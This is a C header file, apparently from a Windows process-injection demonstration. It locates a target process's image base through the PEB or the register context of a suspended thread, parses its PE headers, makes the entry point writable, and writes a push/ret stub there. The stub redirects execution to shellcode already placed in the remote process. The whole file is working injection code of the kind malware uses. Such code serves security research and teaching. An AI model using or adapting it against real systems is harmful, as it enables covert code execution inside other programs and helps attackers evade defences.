#pragma once
#include <stdio.h>
#include "ntddk.h"
#include "pe_hdrs_helper.h"
#define PAGE_SIZE 0x1000

// Get image base by a method #1:
LPCVOID getTargetImageBase1(HANDLE hProcess)
{
    PROCESS_BASIC_INFORMATION pbi;
    memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));

    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
    {
        printf("[ERROR] NtQueryInformationProcess failed\n");
        return NULL;
    }

    printf("PEB = %p\n", (LPVOID)pbi.PebBaseAddress);

    LPCVOID ImageBase = 0;
    SIZE_T read_bytes = 0;
    if (!ReadProcessMemory(hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, sizeof(ImageBase), &read_bytes) 
        || read_bytes != sizeof(ImageBase)
       )
    {
        printf("[ERROR] Cannot read from PEB - incompatibile target!\n");
        return NULL;
    }
    return ImageBase;
}

// Get image base by a method #2:
// WARNING: this method of getting Image Base works only if
// the process has been created as a SUSPENDED and didn't run yet
// - it uses specific values of the registers, that are set only in this case.
LPCVOID getTargetImageBase2(HANDLE hProcess, HANDLE hThread)
{
    //get initial context of the target:
#if defined(_WIN64)
    WOW64_CONTEXT context;
    memset(&context, 0, sizeof(WOW64_CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    Wow64GetThreadContext(hThread, &context);
#else	
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(hThread, &context);
#endif
    //get image base of the target:
    DWORD PEB_addr = context.Ebx;

    const SIZE_T kPtrSize = sizeof(DWORD); //for 32 bit
    DWORD targetImageBase = 0; //for 32 bit

    printf("PEB = %x\n", PEB_addr);

    if (!ReadProcessMemory(hProcess, LPVOID(PEB_addr + 8), &targetImageBase, kPtrSize, NULL)) {
        printf("[ERROR] Cannot read from PEB - incompatibile target!\n");
        return false;
    }
    return (LPCVOID)((ULONGLONG)targetImageBase);
}

bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr, HANDLE hThread=NULL)
{
    LPCVOID ImageBase = NULL; //target ImageBase
    if (hThread != NULL) {
        ImageBase = getTargetImageBase2(hProcess, hThread);
    } else {
#if defined(_WIN64)
    printf("[ERROR] 64bit version of this method is not implemented!\n");
    return false;
#else
        ImageBase = getTargetImageBase1(hProcess);
#endif
    }
    if (ImageBase == NULL) {
        printf("[ERROR] Fetching ImageBase failed!\n");
        return false;
    }
    printf("ImageBase = 0x%p\n", ImageBase);

    // read headers:
    SIZE_T read_bytes = 0;
    BYTE hdrs_buf[PAGE_SIZE];
    if (!ReadProcessMemory(hProcess, ImageBase, hdrs_buf, sizeof(hdrs_buf), &read_bytes) && read_bytes != sizeof(hdrs_buf))
    {
        printf("[-] ReadProcessMemory failed\n");
        return false;
    }

    // fetch Entry Point From headers
    IMAGE_NT_HEADERS32 *inh = get_nt_hrds32(hdrs_buf);
    if (inh == NULL) return false;

    IMAGE_OPTIONAL_HEADER32 opt_hdr = inh->OptionalHeader;
    DWORD ep_rva = opt_hdr.AddressOfEntryPoint;

    printf("Entry Point v: %x\n", ep_rva);
    printf("shellcode ptr: %p\n", remote_shellcode_ptr);

    //make a buffer to store the hook code:
    const SIZE_T kHookSize = 0x10;
    BYTE hook_buffer[kHookSize];
    memset(hook_buffer, 0xcc, kHookSize);

    //prepare the redirection:
    //address of the shellcode will be pushed on the stack and called via ret
    hook_buffer[0] = 0x68; //push
    hook_buffer[5] = 0xC3; //ret

    //for 32bit code:
    DWORD shellcode_addr = (DWORD)remote_shellcode_ptr;
    memcpy(hook_buffer + 1, &shellcode_addr, sizeof(shellcode_addr));

    //make a memory page containing Entry Point Writable:
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, kHookSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Virtual Protect Failed!\n");
        return false;
    }

    //paste the redirection at Entry Point:
    SIZE_T writen_bytes = 0;
    if (!WriteProcessMemory(hProcess, (LPBYTE)ImageBase + ep_rva, hook_buffer, sizeof(hook_buffer) , &writen_bytes))
    {
        printf("[-] WriteProcessMemory failed, err = %d\n", GetLastError());
        return false;
    }

    //restore the previous access rights at entry point:
    DWORD oldProtect2;
    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, kHookSize, oldProtect, &oldProtect2)) {
        printf("Virtual Protect Failed!\n");
        return false;
    }
    return true;
}
